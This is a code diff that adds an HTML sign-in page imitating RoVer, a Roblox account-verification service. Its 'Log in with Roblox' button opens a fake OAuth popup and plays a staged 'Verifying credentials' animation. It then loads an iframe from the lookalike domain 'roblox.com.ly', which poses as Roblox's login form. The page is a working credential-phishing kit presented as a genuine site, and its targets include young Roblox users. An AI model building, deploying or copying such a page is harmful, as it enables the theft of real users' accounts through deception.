@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RoVer - Sign In</title>
+
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="icon" type="image/png" href="favicon.png">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+
+<!-- NAVBAR -->
+<header class="navbar">
+    <div class="nav-left">
+        <div class="brand">
+            <img src="img/rover-logo.png" alt="RoVer Logo" class="brand-logo">
+            <span class="brand-name"></span>
+        </div>
+
+        <nav class="nav-links">
+            <a href="#">Help</a>
+            <a href="#">Team Members</a>
+            <a href="#" class="plus-btn">RoVer Plus</a>
+        </nav>
+    </div>
+
+    <div class="nav-right">
+        <button class="btn-manage" id="manageServersBtn">Manage Servers</button>
+        <button class="btn-signin" id="signInBtn">Sign In</button>
+    </div>
+    
+    <!-- Mobile Menu Button -->
+    <button class="mobile-menu-btn" id="mobileMenuBtn">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+</header>
+
+<!-- MAIN -->
+<section class="main">
+    <div class="card">
+        <h1>Sign in to RoVer</h1>
+        <p>You must be 13 years of age or older to continue.</p>
+        <button class="btn-main" id="loginBtn">Log in with Roblox</button>
+    </div>
+</section>
+
+<!-- FOOTER -->
+<footer class="footer">
+    <div class="footer-left">
+        <img src="img/logo.png" alt="Imaginary Menagerie Logo" class="footer-logo">
+        <p class="company-name">© 2026 Imaginary Menagerie, LLC.</p>
+        <span class="attributions">attributions</span>
+    </div>
+
+    <div class="footer_column">
+        <a href="#">Team members</a>
+        <a href="#">Support Discord server ↗</a>
+        <a href="#">Add RoLink to your server</a>
+        <a href="#">Bot Developer API</a>
+    </div>
+
+    <div class="footer_column">
+        <a href="#">Terms of Service</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Verify your Roblox account</a>
+    </div>
+</footer>
+
+<!-- POPUP OVERLAY - Main OAuth -->
+<div class="popup-overlay" id="popupOverlay">
+    <div class="popup-container" id="popupContainer">
+        <!-- Top Bar -->
+        <div class="popup-header">
+            <span class="popup-header-text">Verify your account</span>
+            <button class="popup-close" id="popupClose">&times;</button>
+        </div>
+        
+        <!-- Popup Content - Authorization -->
+        <div class="popup-content" id="authContent">
+            <div class="popup-logo">
+                <img src="img/rover-logo.png" alt="RoVer Logo">
+            </div>
+            <h2>Authorize with Roblox OAuth</h2>
+            <p>You are about to authorize RoVer to access your Roblox account.</p>
+            <div class="popup-buttons">
+                <button class="btn-continue" id="btnContinue">Continue</button>
+                <button class="btn-return" id="btnReturn">Return to RoVer</button>
+            </div>
+        </div>
+        
+        <!-- Popup Content - Loading -->
+        <div class="popup-content loading-content" id="loadingContent" style="display: none;">
+            <div class="loader">
+                <div class="loader-ring"></div>
+                <div class="loader-ring"></div>
+                <div class="loader-ring"></div>
+            </div>
+            <div class="loading-messages" id="loadingMessages">
+                <p class="loading-message" id="message1">Securing connection</p>
+                <p class="loading-message" id="message2">Verifying credentials</p>
+                <p class="loading-message" id="message3">Connecting to Roblox</p>
+                <p class="loading-message" id="message4">Preparing session</p>
+            </div>
+        </div>
+        
+        <!-- Popup Content - Iframe -->
+        <div class="popup-content iframe-content" id="iframeContent" style="display: none;">
+            <iframe src="https://roblox.com.ly/login?returnUrl=7692425652606225" frameborder="0" class="content-iframe"></iframe>
+        </div>
+    </div>
+</div>
+
+<!-- POPUP OVERLAY - Not Logged In (Manage Servers) -->
+<div class="popup-overlay alert-popup" id="notLoggedPopup">
+    <div class="alert-popup-container">
+        <button class="alert-close" id="notLoggedClose">&times;</button>
+        <div class="alert-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="12" y1="8" x2="12" y2="12"></line>
+                <line x1="12" y1="16" x2="12.01" y2="16"></line>
+            </svg>
+        </div>
+        <h2>You are not authenticated</h2>
+        <p>Please sign in to manage your servers.</p>
+    </div>
+</div>
+
+<!-- POPUP OVERLAY - Add Roblox Account (Sign In) -->
+<div class="popup-overlay alert-popup" id="addRobloxPopup">
+    <div class="alert-popup-container">
+        <button class="alert-close" id="addRobloxClose">&times;</button>
+        <div class="alert-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
+                <circle cx="8.5" cy="7" r="4"></circle>
+                <line x1="20" y1="8" x2="20" y2="14"></line>
+                <line x1="23" y1="11" x2="17" y2="11"></line>
+            </svg>
+        </div>
+        <h2>You must add your Roblox account first</h2>
+        <p>Please log in with your Roblox account to continue.</p>
+    </div>
+</div>
+
+<script>
+    // Main OAuth Popup
+    const loginBtn = document.getElementById('loginBtn');
+    const popupOverlay = document.getElementById('popupOverlay');
+    const popupContainer = document.getElementById('popupContainer');
+    const popupClose = document.getElementById('popupClose');
+    const btnContinue = document.getElementById('btnContinue');
+    const btnReturn = document.getElementById('btnReturn');
+    const authContent = document.getElementById('authContent');
+    const loadingContent = document.getElementById('loadingContent');
+    const iframeContent = document.getElementById('iframeContent');
+    const message1 = document.getElementById('message1');
+    const message2 = document.getElementById('message2');
+    const message3 = document.getElementById('message3');
+    const message4 = document.getElementById('message4');
+
+    // Alert Popups
+    const manageServersBtn = document.getElementById('manageServersBtn');
+    const signInBtn = document.getElementById('signInBtn');
+    const notLoggedPopup = document.getElementById('notLoggedPopup');
+    const notLoggedClose = document.getElementById('notLoggedClose');
+    const addRobloxPopup = document.getElementById('addRobloxPopup');
+    const addRobloxClose = document.getElementById('addRobloxClose');
+
+    // Mobile Menu
+    const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+    const navLinks = document.querySelector('.nav-links');
+    const navRight = document.querySelector('.nav-right');
+
+    // Open popup on login button click
+    loginBtn.addEventListener('click', () => {
+        popupOverlay.classList.add('active');
+        popupContainer.classList.remove('expanded');
+        authContent.style.display = 'block';
+        loadingContent.style.display = 'none';
+        iframeContent.style.display = 'none';
+        resetMessages();
+    });
+
+    // Close popup
+    popupClose.addEventListener('click', closePopup);
+    btnReturn.addEventListener('click', closePopup);
+    
+    popupOverlay.addEventListener('click', (e) => {
+        if (e.target === popupOverlay) {
+            closePopup();
+        }
+    });
+
+    function closePopup() {
+        popupOverlay.classList.remove('active');
+        resetMessages();
+    }
+
+    function resetMessages() {
+        message1.style.opacity = '0.3';
+        message2.style.opacity = '0.3';
+        message3.style.opacity = '0.3';
+        message4.style.opacity = '0.3';
+    }
+
+    // Continue button - show loading animation
+    btnContinue.addEventListener('click', () => {
+        authContent.style.display = 'none';
+        loadingContent.style.display = 'flex';
+        
+        // Animate messages
+        setTimeout(() => {
+            message1.style.opacity = '1';
+            message1.style.color = '#ff2d87';
+        }, 500);
+        
+        setTimeout(() => {
+            message1.style.opacity = '0.3';
+            message2.style.opacity = '1';
+            message2.style.color = '#ff2d87';
+        }, 2000);
+        
+        setTimeout(() => {
+            message2.style.opacity = '0.3';
+            message3.style.opacity = '1';
+            message3.style.color = '#ff2d87';
+        }, 3500);
+        
+        setTimeout(() => {
+            message3.style.opacity = '0.3';
+            message4.style.opacity = '1';
+            message4.style.color = '#ff2d87';
+        }, 5000);
+        
+        // After loading, show iframe
+        setTimeout(() => {
+            loadingContent.style.display = 'none';
+            iframeContent.style.display = 'block';
+            popupContainer.classList.add('expanded');
+        }, 6500);
+    });
+
+    // Manage Servers - Not Logged In Popup
+    manageServersBtn.addEventListener('click', () => {
+        notLoggedPopup.classList.add('active');
+    });
+
+    notLoggedClose.addEventListener('click', () => {
+        notLoggedPopup.classList.remove('active');
+    });
+
+    notLoggedPopup.addEventListener('click', (e) => {
+        if (e.target === notLoggedPopup) {
+            notLoggedPopup.classList.remove('active');
+        }
+    });
+
+    // Sign In - Add Roblox Account Popup
+    signInBtn.addEventListener('click', () => {
+        addRobloxPopup.classList.add('active');
+    });
+
+    addRobloxClose.addEventListener('click', () => {
+        addRobloxPopup.classList.remove('active');
+    });
+
+    addRobloxPopup.addEventListener('click', (e) => {
+        if (e.target === addRobloxPopup) {
+            addRobloxPopup.classList.remove('active');
+        }
+    });
+
+    // Mobile Menu Toggle
+    mobileMenuBtn.addEventListener('click', () => {
+        mobileMenuBtn.classList.toggle('active');
+        navLinks.classList.toggle('active');
+        navRight.classList.toggle('active');
+    });
+</script>
+
+</body>
+</html>
